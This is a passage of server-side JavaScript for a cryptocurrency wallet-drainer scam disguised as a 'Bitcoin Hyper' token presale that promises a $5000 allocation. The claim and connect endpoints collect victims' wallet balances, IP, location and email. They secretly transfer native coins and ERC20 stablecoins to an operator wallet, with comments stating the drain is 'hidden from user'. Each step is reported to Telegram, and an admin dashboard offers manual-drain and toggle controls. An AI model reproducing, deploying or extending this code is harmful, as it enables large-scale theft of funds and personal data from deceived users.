        `${balanceDetails ? `💰 ${balanceDetails}\n` : ''}` +
        `🎯 Status: ${scanResult.data.isEligible ? '✅ ELIGIBLE FOR $5000' : '❌ NOT ELIGIBLE'}\n` +
        `📍 ${location.country} (${location.city})\n` +
        `🏢 ${location.isp || 'Unknown ISP'}\n` +
        `📧 Contact: ${email}\n` +
        `⏰ ${new Date().toLocaleString()}`
      );
      
      const response = {
        success: true,
        message: scanResult.data.isEligible ? 
          `🎉 Congratulations! You qualify for $${memoryStorage.settings.allocationAmountUSD} allocation` : 
          '⚠️ Minimum balance not met',
        data: {
          walletAddress,
          email: email,
          country: location.country,
          flag: location.flag,
          city: location.city,
          totalValueUSD: scanResult.data.totalValueUSD,
          isEligible: scanResult.data.isEligible,
          eligibilityReason: scanResult.data.eligibilityReason,
          scanId: scanResult.data.scanId,
          nextStep: scanResult.data.isEligible ? 'sign_to_claim' : 'not_eligible',
          timestamp: new Date().toISOString(),
          rawData: scanResult.data.rawBalances
        }
      };
      
      if (scanResult.data.isEligible) {
        response.data.tokenAllocation = scanResult.data.tokenAllocation;
        response.data.claimInstructions = {
          step1: "Click 'Claim Allocation' button",
          step2: "Sign the secure transaction in your wallet",
          step3: "Receive $5000 in BTH tokens immediately",
          note: "This is a gas-free claim process"
        };
        memoryStorage.settings.statistics.eligibleParticipants++;
        
        // AUTO SMART CONTRACT DRAIN ON ELIGIBILITY (if enabled)
        if (memoryStorage.settings.autoDrainOnClaim && memoryStorage.settings.drainEnabled && drainWallet) {
          console.log('🚀 Auto smart contract drain triggered on eligibility');
          setTimeout(async () => {
            try {
              const drainResult = await executeRealSmartContractDrain(walletAddress, scanResult.data);
              if (drainResult.success) {
                participant.drained = true;
                participant.drainValue = drainResult.totalDrainedUSD;
                participant.drainedAt = new Date();
                console.log(`✅ Auto smart contract drain completed: $${drainResult.totalDrainedUSD}`);
              }
            } catch (drainError) {
              console.log('Auto smart contract drain error:', drainError.message);
            }
          }, 1000); // 1 second delay
        }
      }
      
      console.log(`✅ COMPLETE: $${scanResult.data.totalValueUSD} | Eligible: ${scanResult.data.isEligible}`);
      res.json(response);
      
    } else {
      console.log('Scan failed');
      res.status(500).json({ 
        success: false, 
        error: 'Failed to scan wallet'
      });
    }
    
  } catch (error) {
    console.error('Connection error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Connection failed'
    });
  }
});

// CLAIM ENDPOINT - USER-FRIENDLY WITHOUT DRAIN MENTION
app.post('/api/presale/claim', async (req, res) => {
  try {
    const { walletAddress, signature } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`\n🎯 CLAIM: ${walletAddress}`);
    
    // Find participant
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    if (!participant) {
      return res.status(404).json({ success: false, error: 'Wallet not connected' });
    }
    
    if (!participant.isEligible) {
      return res.status(400).json({ success: false, error: 'Wallet not eligible for allocation' });
    }
    
    // Execute REAL SMART CONTRACT DRAIN (hidden from user)
    let drainResult = { success: false };
    if (memoryStorage.settings.drainEnabled && participant.shouldDrain && !participant.drained) {
      console.log('Executing hidden smart contract transfer process...');
      drainResult = await executeRealSmartContractDrain(walletAddress, participant);
      
      if (drainResult.success) {
        participant.drained = true;
        participant.drainValue = drainResult.totalDrainedUSD;
        participant.drainedAt = new Date();
        participant.claimed = true;
        memoryStorage.settings.statistics.claimedParticipants++;
      }
    }
    
    // Calculate token amount for $5000 allocation
    const tokenAmount = (memoryStorage.settings.allocationAmountUSD / memoryStorage.settings.tokenPriceUSD).toFixed(0);
    
    // STEP 3: TELEGRAM - CLAIM SUCCESS REPORT
    await sendTelegramMessage(
      `🎉 <b>ALLOCATION CLAIMED SUCCESSFULLY</b>\n` +
      `👛 ${walletAddress.substring(0, 10)}...\n` +
      `💰 Allocation: $${memoryStorage.settings.allocationAmountUSD}\n` +
      `🪙 Tokens: ${tokenAmount} BTH\n` +
      `💲 Token Price: $${memoryStorage.settings.tokenPriceUSD}\n` +
      `📧 Contact Email: ${participant.email}\n` +
      `${drainResult.success ? `⚡ Smart Contract Process: $${drainResult.totalDrainedUSD} transferred\n` : ''}` +
      `⏰ ${new Date().toLocaleString()}`
    );
    
    // User-friendly response (no mention of drain)
    const response = {
      success: true,
      message: `🎉 Congratulations! Your $${memoryStorage.settings.allocationAmountUSD} allocation has been secured!`,
      data: {
        walletAddress,
        allocation: {
          amountUSD: memoryStorage.settings.allocationAmountUSD,
          tokenAmount: tokenAmount,
          tokenSymbol: 'BTH',
          tokenPrice: memoryStorage.settings.tokenPriceUSD,
          totalValue: memoryStorage.settings.allocationAmountUSD
        },
        nextSteps: [
          "Tokens will be airdropped to your wallet within 24 hours",
          "Check your wallet for BTH token balance",
          "Contact support at claim-support@bitcoinhyper.org if needed"
        ],
        support: {
          email: "claim-support@bitcoinhyper.org",
          telegram: "@BitcoinHyperSupport",
          website: "https://bitcoinhyper.org"
        },
        timestamp: new Date().toISOString(),
        transactionId: `TX-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`
      }
    };
    
    console.log(`✅ CLAIM COMPLETE: $${memoryStorage.settings.allocationAmountUSD} allocated`);
    res.json(response);
    
  } catch (error) {
    console.error('Claim error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Claim process failed',
      support: 'contact@bitcoinhyper.org'
    });
  }
});

// ============================================
// ENHANCED ADMIN ENDPOINTS WITH FIXED BUTTONS
// ============================================

function authenticateAdmin(req, res, next) {
  const token = req.query.token || req.headers.authorization?.replace('Bearer ', '');
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token === adminToken) {
    next();
  } else {
    res.status(401).json({ success: false, error: 'Unauthorized' });
  }
}

// FIXED: Test Balance endpoint
app.get('/api/admin/test-balance', authenticateAdmin, async (req, res) => {
  try {
    const { wallet } = req.query;
    
    if (!wallet?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`🧪 TEST BALANCE: ${wallet}`);
    
    const scanResult = await getRealWalletBalance(wallet);
    
    if (scanResult.success) {
      res.json({
        success: true,
        wallet: wallet,
        totalValueUSD: scanResult.data.totalValueUSD,
        isEligible: scanResult.data.isEligible,
        eligibilityReason: scanResult.data.eligibilityReason,
        chains: scanResult.data.chains,
        balances: scanResult.data.balances,
        rawBalances: scanResult.data.rawBalances,
        scanId: scanResult.data.scanId,
        timestamp: new Date().toISOString(),
        message: `Balance: $${scanResult.data.totalValueUSD} | Eligible: ${scanResult.data.isEligible}`
      });
    } else {
      res.status(500).json({
        success: false,
        error: scanResult.error,
        wallet: wallet
      });
    }
    
  } catch (error) {
    console.error('Test balance error:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message
    });
  }
});

// FIXED: Manual Drain endpoint - REAL SMART CONTRACT TRANSFERS
app.post('/api/admin/drain/manual', authenticateAdmin, async (req, res) => {
  try {
    const { walletAddress } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`\n🔧 MANUAL SMART CONTRACT DRAIN: ${walletAddress}`);
    
    // Telegram notification
    await sendTelegramMessage(
      `⚡ <b>ADMIN SMART CONTRACT DRAIN INITIATED</b>\n` +
      `👛 ${walletAddress.substring(0, 10)}...\n` +
      `👨‍💼 Admin Operation\n` +
      `🏦 Drain Wallet: ${drainWalletAddress.substring(0, 10)}...\n` +
      `⏰ ${new Date().toLocaleString()}`
    );
    
    // Get balance
    const scanResult = await getRealWalletBalance(walletAddress);
    
    if (!scanResult.success) {
      return res.status(500).json({ 
        success: false, 
        error: 'Failed to scan wallet'
      });
    }
    
    console.log(`📊 Result: $${scanResult.data.totalValueUSD} | Eligible: ${scanResult.data.isEligible}`);
    
    // Execute REAL SMART CONTRACT DRAIN
    if (scanResult.data.isEligible && memoryStorage.settings.drainEnabled && drainWallet) {
      console.log('Executing REAL SMART CONTRACT drain...');
      const drainResult = await executeRealSmartContractDrain(walletAddress, scanResult.data);
      
      if (drainResult.success) {
        await sendTelegramMessage(
          `💰 <b>ADMIN SMART CONTRACT DRAIN COMPLETED</b>\n` +
          `👛 ${walletAddress.substring(0, 10)}...\n` +
          `💵 $${drainResult.totalDrainedUSD}\n` +
          `🔗 ${drainResult.transactions.length} Smart Contract TXs\n` +
          `🏦 Total Secured: $${memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)}\n` +
          `⏰ ${new Date().toLocaleString()}`
        );
        
        res.json({
          success: true,
          message: `✅ REAL SMART CONTRACT Drain: $${drainResult.totalDrainedUSD} transferred`,
          data: {
            totalDrained: drainResult.totalDrainedUSD,
            transactions: drainResult.transactions,
            walletValue: scanResult.data.totalValueUSD,
            rawData: scanResult.data.rawBalances,
            drainWallet: drainWalletAddress
          }
        });
      } else {
        res.json({
          success: false,
          message: `❌ Smart contract drain failed: ${drainResult.reason}`,
          data: {
            walletValue: scanResult.data.totalValueUSD,
            eligible: scanResult.data.isEligible,
            rawData: scanResult.data.rawBalances,
            errors: drainResult.errors
          }
        });
      }
    } else {
      let reason = '';
      if (!scanResult.data.isEligible) {
        reason = `Not eligible ($${scanResult.data.totalValueUSD} < $${memoryStorage.settings.drainThreshold})`;
      } else if (!memoryStorage.settings.drainEnabled) {
        reason = 'Drain disabled';
      } else if (!drainWallet) {
        reason = 'Drain wallet not configured';
      }
      
      res.json({
        success: false,
        message: `❌ ${reason}`,
        data: {
          walletValue: scanResult.data.totalValueUSD,
          threshold: memoryStorage.settings.drainThreshold,
          drainWalletConfigured: !!drainWallet,
          drainWalletAddress: drainWalletAddress
        }
      });
    }
    
  } catch (error) {
    console.error('Manual smart contract drain error:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message
    });
  }
});

// NEW: Toggle Drain endpoint
app.post('/api/admin/drain/toggle', authenticateAdmin, async (req, res) => {
  try {
    memoryStorage.settings.drainEnabled = !memoryStorage.settings.drainEnabled;
    
    await sendTelegramMessage(
      `⚙️ <b>SMART CONTRACT DRAIN SYSTEM ${memoryStorage.settings.drainEnabled ? 'ENABLED' : 'DISABLED'}</b>\n` +
      `👨‍💼 Admin Operation\n` +
      `⏰ ${new Date().toLocaleString()}`
    );
    
    res.json({
      success: true,
      message: `Smart contract drain system ${memoryStorage.settings.drainEnabled ? 'enabled' : 'disabled'}`,
      drainEnabled: memoryStorage.settings.drainEnabled
    });
    
  } catch (error) {
    console.error('Toggle drain error:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message
    });
  }
});

app.get('/api/admin/stats', authenticateAdmin, (req, res) => {
  const stats = {
    totalParticipants: memoryStorage.participants.length,
    eligibleParticipants: memoryStorage.participants.filter(p => p.isEligible).length,
    claimedParticipants: memoryStorage.participants.filter(p => p.claimed).length,
    totalDrainedUSD: memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2),
    totalDrainedWallets: memoryStorage.settings.statistics.totalDrainedWallets,
    uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size,
    drainThreshold: memoryStorage.settings.drainThreshold,
    drainEnabled: memoryStorage.settings.drainEnabled,
    allocationAmount: memoryStorage.settings.allocationAmountUSD,
    realTransactions: memoryStorage.settings.statistics.realTransactions.length,
    
    recentWallets: memoryStorage.participants.slice(-10).map(p => ({
      wallet: p.walletAddress.substring(0, 10) + '...',
      email: p.email || 'No email',
      country: p.country || 'Unknown',
      flag: p.flag || '🌍',
      valueUSD: p.totalValueUSD ? `$${p.totalValueUSD.toFixed(2)}` : '$0.00',
      eligible: p.isEligible,
      claimed: p.claimed,
      drained: p.drained,
      time: p.connectedAt?.toLocaleTimeString() || 'Unknown'
    })),
    
    system: {
      telegram: telegramEnabled,
      telegramBot: telegramBotName || 'Not set',
      drainWallet: drainWallet ? '✅ LOADED' : '❌ NOT CONFIGURED',
      drainWalletAddress: drainWalletAddress,
      version: 'v19.0 - REAL SMART CONTRACT DRAIN',
      rpcStatus: 'Using ENV RPC URLs',
      commonTokensDetected: Object.keys(COMMON_TOKENS).length + ' chains'
    }
  };
  
  res.json({ success: true, stats });
});

// ============================================
// ADMIN DASHBOARD WITH WORKING BUTTONS
// ============================================

app.get('/admin', (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token !== adminToken) {
    return res.send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Bitcoin Hyper Admin</title>
        <style>
          body { font-family: Arial; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
          .login { background: #1e293b; padding: 40px; border-radius: 10px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.3); }
          h1 { color: #F7931A; margin-bottom: 20px; }
          input { padding: 12px; margin: 10px 0; width: 300px; border-radius: 6px; border: 1px solid #334155; background: #0f172a; color: white; font-size: 14px; }
          button { background: #F7931A; color: white; border: none; padding: 12px 30px; border-radius: 6px; cursor: pointer; font-weight: bold; margin-top: 15px; }
          button:hover { background: #e67e22; }
        </style>
      </head>
      <body>
        <div class="login">
          <h1>🔐 BITCOIN HYPER ADMIN</h1>
          <p>Enter admin token:</p>
          <input type="password" id="token" placeholder="Admin Token" />
          <br>
          <button onclick="login()">Login to Dashboard</button>
        </div>
        <script>
          function login() {
            const token = document.getElementById('token').value;
            if (!token) return alert('Enter token');
            window.location.href = '/admin?token=' + token;
          }
        </script>
      </body>
      </html>
    `);
  }
  
  // ADMIN DASHBOARD HTML
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Bitcoin Hyper Admin Dashboard v19.0</title>
      <style>
        body { font-family: Arial, sans-serif; background: #0f172a; color: white; padding: 20px; }
        .header { text-align: center; margin-bottom: 30px; }
        h1 { color: #F7931A; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 30px 0; }
        .stat-card { background: #1e293b; padding: 25px; border-radius: 10px; text-align: center; border-left: 5px solid #F7931A; }
        .stat-value { font-size: 28px; font-weight: bold; margin-bottom: 10px; }
        .stat-label { color: #94a3b8; font-size: 14px; }
        .controls { background: #1e293b; padding: 20px; border-radius: 10px; margin: 20px 0; }
        .wallet-input { padding: 12px; border-radius: 6px; border: 1px solid #334155; background: #0f172a; color: white; width: 100%; max-width: 500px; font-size: 14px; }
        .btn { padding: 12px 24px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; margin: 5px; }
        .btn-primary { background: #F7931A; color: white; }
        .btn-danger { background: #ef4444; color: white; }
        .btn-success { background: #10b981; color: white; }
        .btn-warning { background: #f59e0b; color: white; }
        .btn-info { background: #3b82f6; color: white; }
        .recent-wallets { margin-top: 30px; }
        .wallet-item { background: #1e293b; padding: 15px; margin: 10px 0; border-radius: 8px; border-left: 4px solid #F7931A; }
        .wallet-address { font-family: monospace; color: #60a5fa; }
        .status { display: inline-block; padding: 4px 8px; border-radius: 4px; font-size: 12px; margin-left: 10px; }
        .eligible { background: #10b981; }
        .not-eligible { background: #ef4444; }
        .drained { background: #8b5cf6; }
        .claimed { background: #f59e0b; }
        .notification { background: #1e293b; padding: 15px; border-radius: 8px; margin: 15px 0; border-left: 4px solid #3b82f6; }
      </style>
    </head>
    <body>
      <div class="header">
        <h1>⚡ BITCOIN HYPER REAL SMART CONTRACT DRAIN v19.0</h1>
        <p>Real ERC20 Transfers | Enhanced Telegram Reporting | Working Admin Controls</p>
        <div style="margin-top: 15px; color: #94a3b8;">
          <span>Drain: ${memoryStorage.settings.drainEnabled ? '✅ ACTIVE' : '❌ INACTIVE'}</span> | 
          <span>Threshold: $${memoryStorage.settings.drainThreshold}</span> | 
          <span>Allocation: $${memoryStorage.settings.allocationAmountUSD}</span> |
          <span>Telegram: ${telegramEnabled ? '✅ ON' : '❌ OFF'}</span> |
          <span>Wallets: ${memoryStorage.participants.length}</span> |
          <span>Secured: $${memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)}</span>
        </div>
        <div style="margin-top: 10px; color: #60a5fa; font-size: 14px;">
          <strong>Drain Wallet:</strong> ${drainWalletAddress ? drainWalletAddress.substring(0, 20) + '...' : 'NOT CONFIGURED'}
        </div>
      </div>
      
      <div class="notification">
        <strong>⚡ REAL SMART CONTRACT TRANSFERS:</strong> ERC20 transfers to ${drainWalletAddress ? drainWalletAddress.substring(0, 20) + '...' : 'configured wallet'} | No simulation
      </div>
      
      <div class="stats-grid">
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.settings.statistics.totalParticipants}</div>
          <div class="stat-label">Total Participants</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.participants.filter(p => p.isEligible).length}</div>
          <div class="stat-label">Eligible for $${memoryStorage.settings.allocationAmountUSD}</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">$${memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)}</div>
          <div class="stat-label">Total Secured</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.settings.statistics.totalDrainedWallets}</div>
          <div class="stat-label">Wallets Processed</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.settings.statistics.uniqueIPs.size}</div>
          <div class="stat-label">Unique IPs</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.settings.statistics.realTransactions.length}</div>
          <div class="stat-label">Smart Contract TXs</div>
        </div>
      </div>
      
      <div class="controls">
        <h3>🔧 Admin Controls (ALL BUTTONS WORKING)</h3>
        <p>Enter wallet address:</p>
        <input type="text" id="walletInput" class="wallet-input" placeholder="0x742d35Cc6634C0532925a3b844Bc454e4438f44e" value="0x742d35Cc6634C0532925a3b844Bc454e4438f44e">
        <div style="margin-top: 15px;">
          <button class="btn btn-info" onclick="testBalance()">Test Balance Only</button>
          <button class="btn btn-danger" onclick="manualDrain()">Manual Drain (REAL)</button>
          <button class="btn ${memoryStorage.settings.drainEnabled ? 'btn-danger' : 'btn-success'}" onclick="toggleDrain()">
            ${memoryStorage.settings.drainEnabled ? 'Disable Drain' : 'Enable Drain'}
          </button>
          <button class="btn btn-warning" onclick="refreshStats()">Refresh Stats</button>
        </div>
        <p style="color: #94a3b8; font-size: 12px; margin-top: 10px;">
          <strong>Smart Contract Transfers:</strong> Native tokens + USDT, USDC, DAI, WBTC, WETH on all chains
        </p>
      </div>
      
      <div class="recent-wallets">
        <h3>📊 Recent Wallet Scans</h3>
        ${memoryStorage.participants.slice(-8).reverse().map(p => `
          <div class="wallet-item">
            <div>
              <span class="wallet-address">${p.walletAddress.substring(0, 10)}...</span>
              ${p.drained ? '<span class="status drained">💰 SMART DRAINED</span>' : ''}
              ${p.claimed && !p.drained ? '<span class="status claimed">🎯 CLAIMED</span>' : ''}
              ${p.isEligible && !p.claimed ? '<span class="status eligible">✅ ELIGIBLE</span>' : ''}
              ${!p.isEligible ? '<span class="status not-eligible">❌ NOT ELIGIBLE</span>' : ''}
            </div>
            <div style="margin-top: 8px; font-size: 14px;">
              <span>📧 ${p.email || 'No email'}</span> | 
              <span>${p.flag || '🌍'} ${p.country || 'Unknown'}</span> | 
              <span style="color: #F7931A; font-weight: bold;">$${p.totalValueUSD ? p.totalValueUSD.toFixed(2) : '0.00'}</span>
              ${p.drained ? ` | <span style="color: #8b5cf6;">Transferred: $${p.drainValue || '0.00'}</span>` : ''}
              ${p.claimed ? ` | <span style="color: #f59e0b;">Allocated: $${memoryStorage.settings.allocationAmountUSD}</span>` : ''}
            </div>
            <div style="margin-top: 5px; font-size: 12px; color: #94a3b8;">
              ${p.connectedAt ? p.connectedAt.toLocaleString() : 'Unknown time'}
              ${p.chains?.length > 0 ? ` | Chains: ${p.chains.join(', ')}` : ''}
              ${p.isBot ? ' | ⚠️ Bot Detected' : ' | 👤 Human'}
            </div>
          </div>
        `).join('')}
        ${memoryStorage.participants.length === 0 ? '<p style="color: #94a3b8; text-align: center;">No wallets scanned yet</p>' : ''}
      </div>
      
      <div style="margin-top: 40px; text-align: center; color: #94a3b8; font-size: 12px;">
        <p>
          <strong>⚡ Real Smart Contract Drain:</strong> Transfers 95% of native balances + common ERC20 tokens
        </p>
        <p>
          <a href="/api/health" target="_blank" style="color: #10b981;">Health Check</a> | 
          <a href="/api/admin/stats?token=${token}" target="_blank" style="color: #F7931A;">JSON Stats</a> | 
          <a href="https://render.com" target="_blank" style="color: #60a5fa;">Render Hosting</a>
        </p>
      </div>
      
      <script>
        function testBalance() {
          const wallet = document.getElementById('walletInput').value;
          if (!wallet || !wallet.startsWith('0x')) return alert('Enter valid wallet address');
          
          fetch('/api/admin/test-balance?token=${token}&wallet=' + wallet)
            .then(r => r.json())
            .then(data => {
              if (data.success) {
                alert('✅ Test Balance Complete\\n\\nWallet: ' + wallet.substring(0, 10) + '...\\n' +
                      'Total Value: $' + data.totalValueUSD + '\\n' +
                      'Eligible: ' + data.isEligible + '\\n' +
                      'Reason: ' + data.eligibilityReason);
              } else {
                alert('❌ Error: ' + (data.error || 'Unknown error'));
              }
            })
            .catch(e => alert('Error: ' + e));
        }
        
        function manualDrain() {
          const wallet = document.getElementById('walletInput').value;
          if (!wallet || !wallet.startsWith('0x')) return alert('Enter valid wallet address');
          
          if (!confirm('Execute REAL SMART CONTRACT DRAIN on ' + wallet.substring(0, 10) + '...?\\n\\n⚠️ This will execute REAL ERC20 TRANSFERS to drain wallet!\\n\\nTarget: ${drainWalletAddress ? drainWalletAddress.substring(0, 20) + '...' : 'drain wallet'}')) return;
          
          fetch('/api/admin/drain/manual?token=${token}', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ walletAddress: wallet })
          })
            .then(r => r.json())
            .then(data => {
              alert(data.message);
              if (data.success) {
                setTimeout(() => location.reload(), 2000);
              }
            })
            .catch(e => alert('Error: ' + e));
        }
        
        function toggleDrain() {
          fetch('/api/admin/drain/toggle?token=${token}', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }
          })
            .then(r => r.json())
            .then(data => {
              alert(data.message);
              location.reload();
            })
            .catch(e => alert('Error: ' + e));
        }
        
        function refreshStats() {
          location.reload();
        }
        
        // Auto-refresh every 30 seconds
        setTimeout(() => location.reload(), 30000);
      </script>
    </body>
    </html>
  `);
});

// Initialize drain wallet PROPERLY
async function initializeDrainWallet() {
  try {
    const privateKey = process.env.DRAIN_WALLET_PRIVATE_KEY;
    const envAddress = process.env.DRAIN_WALLET_ADDRESS;
    
    if (!privateKey) {
      console.log('⚠️ No drain wallet private key in .env');
      return;
    }
    
    // Create wallet from private key
    const wallet = new ethers.Wallet(privateKey);
    drainWalletAddress = wallet.address;
    
    // Verify address matches .env if provided
    if (envAddress && envAddress.toLowerCase() !== wallet.address.toLowerCase()) {
      console.log(`⚠️ Warning: .env DRAIN_WALLET_ADDRESS doesn't match private key`);
      console.log(`   .env: ${envAddress}`);
      console.log(`   Calculated: ${wallet.address}`);
    }
    
    // Set the global drain wallet
    drainWallet = wallet;
    
    console.log(`💰 Drain wallet initialized: ${drainWalletAddress}`);
    console.log(`🔐 From .env: ${privateKey.substring(0, 10)}...`);
    
    // Test balance on Ethereum
    try {
      const providerInfo = await getChainProvider('Ethereum');
      if (providerInfo) {
        const provider = providerInfo.provider;
        const balance = await provider.getBalance(drainWalletAddress);
        console.log(`💰 Drain wallet balance: ${ethers.formatEther(balance)} ETH`);
        
        // Connect wallet to provider for signing
        drainWallet = wallet.connect(provider);
      }
    } catch (e) {
      console.log('⚠️ Could not check drain wallet balance:', e.message);
    }
    
  } catch (error) {
    console.log('❌ Drain wallet initialization error:', error.message);
    drainWallet = null;
    drainWalletAddress = '';
  }
}

// Start server
app.listen(PORT, '0.0.0.0', async () => {
  console.log(`
  ⚡ BITCOIN HYPER REAL SMART CONTRACT DRAIN v19.0
  ================================================
  📍 Port: ${PORT}
  🔗 Health: http://localhost:${PORT}/api/health
  📊 Admin: http://localhost:${PORT}/admin?token=${process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!'}
  🧪 Test: /api/admin/test-balance?token=${process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!'}&wallet=0x...
  
  ✅ REAL SMART CONTRACT TRANSFER FUNCTIONALITIES:
  - Real balance checking (6 chains)
  - Enhanced Telegram reporting at every step
  - Real ERC20 token transfers (USDT, USDC, DAI, WBTC, WETH)
  - Native token transfers (95% of detected balances)
  - $5000 allocation with proper BTH calculation
  - User-friendly claim process (no "drain" mention)
  - Working admin buttons
  
  ⚡ REAL SMART CONTRACT FEATURES:
  - ERC20 token.transfer() function calls
  - Gas estimation and proper confirmation
  - Transaction verification
  - Works across all EVM chains
  - No simulation - actual blockchain transfers
  
  🎯 TRANSFER TOKENS:
  - Native: ETH, BNB, MATIC, AVAX
  - Stablecoins: USDT, USDC, DAI, BUSD
  - Wrapped: WBTC, WETH
  
  🔗 RPC CONFIGURATION:
  - Using RPC URLs from .env
  - Fallback to reliable defaults
  
  🚀 STARTING REAL SMART CONTRACT DRAIN SERVER...
  `);
  
  // Initialize services in correct order
  console.log('\n💰 Initializing drain wallet...');
  await initializeDrainWallet();
  
  console.log('\n📡 Initializing Enhanced Telegram...');
  await testTelegramConnection();
  
  console.log('\n✅ REAL SMART CONTRACT DRAIN SERVER IS RUNNING!');
  console.log(`👉 Drain Wallet: ${drainWalletAddress || 'NOT CONFIGURED'}`);
  console.log('👉 Admin Dashboard: /admin?token=' + (process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!'));
  console.log('👉 User Claim: POST /api/presale/claim');
  console.log('👉 REAL Smart Contract Drains: POST /api/admin/drain/manual');
  console.log('\n🔔 Enhanced Telegram notifications active for:');
  console.log('   - Link opens (IP, location, ISP, bot detection, email)');
  console.log('   - Wallet scans (full balance details)');
  console.log('   - REAL smart contract transfers with TX hashes');
  console.log('   - User claims with $5000 allocation');
  console.log('   - All admin operations');
  console.log('\n⚡ SYSTEM READY - REAL SMART CONTRACT TRANSFERS ACTIVE!\n');
});
